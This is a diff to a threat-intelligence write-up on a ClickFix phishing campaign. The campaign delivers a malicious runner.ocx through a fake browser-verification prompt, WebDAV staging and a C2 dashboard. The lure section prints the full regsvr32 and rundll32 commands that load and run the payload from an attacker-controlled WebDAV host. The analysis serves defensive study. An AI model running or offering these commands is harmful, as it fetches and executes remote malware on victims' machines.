@@ -113,21 +113,28 @@ WebDav is a new concept I've come to learn in my analysis. Here's what Claude ta
 WebDAV (Web Distributed Authoring and Versioning) extends HTTP to allow clients to read, write, and manage files on remote web servers. Legitimate use cases include SharePoint, remote file collaboration, and content management systems. Attackers love it for the same reason: it is a file transfer protocol hiding in plain sight, often permitted through firewalls that would block other staging mechanisms.
 ````
 # Attack Chain
+
 During static analysis of runner.ocx, we identified an exported function named DllInstall containing the malware payload. Combining that with our threat intelligence, we can map out what the attack chain looks like in execution.
 
 ## The Phish
+
 The victim is phished, usually via email. They download an attachment or follow a link within an email. That link brings them to the malicious clickfix website  (i.e, screenly[.]cam). On the clickfix website, the victim is presented with a message.
+
 ````
 "An error occurred verifying your browser. To fix this, press Windows + R, paste the code below, and press Enter."
 ````
 The victim is requested to copy code which may be base64 encoded or plaintext like the example below. 
+
 ````
 regsvr32.exe \\xtrafftrck.net@80\files\runner.ocx
 or
 rundll32.exe \\xtrafftrck.net@80\files\runner.ocx,DllInstall
 ````
+
 ## The Attack
+
 Here's what happens.
+
 ````
 1. regsvr32.exe or rundll32.exe receives the UNC path as an argument.
 
@@ -140,6 +147,7 @@ Here's what happens.
 5. The implant is now executing in memory.
 ````
 ## Command and Control
+
 Now that the malware has executed, the C2 is called and the operator controls the victim's computer.
 
 ````
@@ -149,6 +157,7 @@ Operator manages victim computer via Chopi Monitoring Dashboard
 ````
 
 ## Conclusion
+
 During our threat intelligence campaign, we used various web tools to bring together disparate artifacts. Togther hey map out the attackers infrastructure, attack patterns and Opsec strengths and weaknesses. Small mistakes in operator security, like certificate reuse and consistent infrastructure patterns, are what ultimately expose a threat actor's full campaign.
 
 ## References
